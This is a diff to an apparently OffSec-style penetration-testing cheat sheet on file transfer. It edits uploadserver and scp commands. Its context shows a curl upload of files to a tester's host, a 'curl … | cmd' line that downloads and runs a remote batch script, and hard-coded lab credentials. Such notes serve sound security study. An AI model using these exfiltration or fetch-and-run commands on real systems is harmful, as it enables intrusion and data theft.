@@ -13,7 +13,7 @@ python3 -m http.server $port
 
 ##### HTTP PUT
 ```python
-python3 -m uploadserver --basic-auth-upload offsec:wandton
+python3 -m uploadserver --basic-auth-upload offsec:wandton 8123
 ```
 
 ##### FTP
@@ -48,10 +48,11 @@ curl -X POST http://$tip:8000/upload -F 'files=@$filename' -u offsec:wandton
 curl http://server/file.bat | cmd
 ```
 ##### SSH
+Upload
 ```bash
-scp $file $user@$hip:"C:\\Users\\$user\\Downloads"
+scp -i id_rsa_kali $file kali@$hip:"/home/kali/"
 ```
-
+Download
 ```bash
 scp $user@$hip:'C:\\Users\\$user\\Downloads\\data.zip' .
 ```
